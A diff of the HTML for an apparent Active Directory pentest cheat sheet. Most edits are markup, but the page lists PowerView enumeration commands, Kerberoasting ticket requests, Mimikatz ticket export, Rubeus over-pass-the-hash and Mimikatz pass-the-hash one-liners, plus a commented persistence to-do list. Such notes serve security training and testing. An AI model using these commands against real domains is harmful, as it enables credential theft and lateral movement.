 <pre  class="mc-prism hide language-text" ><code class="language-powershell">Get-NetComputer [-Domain &lt;target&gt;] [-OperatingSystem &quot;*2016*&quot;] [-Properties &lt;&gt;]
 </code></pre>
@@ -760,7 +1011,30 @@ Gathering data in a loop (default 2hrs), makes sense for sessions as they change
 <p>Finding users who are AllowedToDelegateTo</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">Get-NetComputer -TrustedToAuth
 </code></pre>
-<h4 id="group-enumeration">Group Enumeration</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="group-enumeration">
+
+
+<h4 class="header-anchor-wrapper">Group Enumeration
+  <a href="#group-enumeration" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <p>Get a list of groups in a domain</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">net group /domain
 </code></pre>
@@ -770,11 +1044,57 @@ Gathering data in a loop (default 2hrs), makes sense for sessions as they change
 <p>Get group membership</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">Get-NetGroupMember [-GroupName 'group_name'] [-Recurse]
 </code></pre>
-<h4 id="share-enumeration">Share Enumeration</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="share-enumeration">
+
+
+<h4 class="header-anchor-wrapper">Share Enumeration
+  <a href="#share-enumeration" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <p>List shares user have access to</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">Invoke-ShareFinder -CheckShareAccess -ErrorAction SilentlyContinue [-ComputerDomain &lt;target_domain&gt;]
 </code></pre>
-<h4 id="acl-enumeration">ACL Enumeration</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="acl-enumeration">
+
+
+<h4 class="header-anchor-wrapper">ACL Enumeration
+  <a href="#acl-enumeration" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <p>Get resolved ACEs, optionally for a specific user/group and domain</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">Get-ObjectAcl [-Identity &lt;user_name&gt;] [-Domain &lt;target_domain&gt;] -ResolveGUIDs
 </code></pre>
@@ -784,14 +1104,60 @@ Gathering data in a loop (default 2hrs), makes sense for sessions as they change
 <p>Get interesting resolved ACLs owned by specific object (ex. noobsec)</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">Invoke-ACLScanner -ResolveGUIDS \| ?{$_.IdentityReference -match 'noobsec'}
 </code></pre>
-<h4 id="session-enumeration">Session Enumeration</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="session-enumeration">
+
+
+<h4 class="header-anchor-wrapper">Session Enumeration
+  <a href="#session-enumeration" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <p>Finding sessions on a computer</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">Get-NetSession [-Computer &lt;comp_name&gt;]
 </code></pre>
 <p>Get who is logged on locally where</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">Get-LoggedOnLocal [-ComputerName &lt;comp_name&gt;]
 </code></pre>
-<h4 id="user-hunting">User Hunting</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="user-hunting">
+
+
+<h4 class="header-anchor-wrapper">User Hunting
+  <a href="#user-hunting" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <p>Get list of machines where current user has local admin access</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">Find-LocalAdminAccess [-Domain &lt;target_domain&gt;]
 </code></pre>
@@ -801,20 +1167,112 @@ Gathering data in a loop (default 2hrs), makes sense for sessions as they change
 <p>Find machines where current user has local admin access AND specific group sessions are present</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">Invoke-UserHunter -CheckAccess
 </code></pre>
-<h2 id="lateral-movement">Lateral Movement</h2>
-<h3 id="kerberoasting">Kerberoasting</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="lateral-movement">
+
+
+<h2 class="header-anchor-wrapper">Lateral Movement
+  <a href="#lateral-movement" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="kerberoasting">
+
+
+<h3 class="header-anchor-wrapper">Kerberoasting
+  <a href="#kerberoasting" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>To see existing tickets</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">klist
 </code></pre>
 <p>Remove all tickets</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">klist purge
 </code></pre>
-<h4 id="powerview">PowerView</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="powerview">
+
+
+<h4 class="header-anchor-wrapper">PowerView
+  <a href="#powerview" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <p>Request a kerberos service ticket for specified SPN.<br>
 By default output in Hashcat format</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">Request-SPNTicket -SPN &quot;CIFS/target.domain.local&quot; [-OutputFormat JTR]
 </code></pre>
-<h4 id="manually">Manually</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="manually">
+
+
+<h4 class="header-anchor-wrapper">Manually
+  <a href="#manually" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <p>By doing it manually, ticket is generated, it requires to be extracted to crack the hash</p>
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;CIFS/target.domain.local&quot;
@@ -823,11 +1281,80 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 <pre  class="mc-prism hide language-text" ><code>Invoke-Mimikatz -Command '&quot;kerberos::list /export&quot;'
 </code></pre>
 <p>Now, crack &rsquo;em</p>
-<h3 id="over-pass-the-hash">Over-Pass the Hash</h3>
-<h4 id="rubeus">Rubeus</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="over-pass-the-hash">
+
+
+<h3 class="header-anchor-wrapper">Over-Pass the Hash
+  <a href="#over-pass-the-hash" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="rubeus">
+
+
+<h4 class="header-anchor-wrapper">Rubeus
+  <a href="#rubeus" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">Rubeus.exe asktgt /user:USER &lt; /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; [/domain:DOMAIN] [/opsec] /ptt
 </code></pre>
-<h4 id="mimikatz">Mimikatz</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="mimikatz">
+
+
+<h4 class="header-anchor-wrapper">Mimikatz
+  <a href="#mimikatz" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <pre  class="mc-prism hide language-text" ><code class="language-powershell">sekurlsa::pth /user:Administrator /domain:target.domain.local &lt; /ntlm:hash | /aes256:hash&gt; /run:powershell.exe
 </code></pre>
 <!--
@@ -845,7 +1372,8 @@ add yourself in admin-sdholder
 give yourself dc sync privs 
 golden ticket
 -->
-
+</section>
+    
 </article>
 </div>
 
@@ -875,11 +1403,13 @@ golden ticket
 </div>
 
                 
+
+                
             </div>
+        </main>
 <footer>
     <article>Made with love...and copious amounts of coffee</article>
 </footer>
 
-</main>
-    </body>
+</body>
 </html>
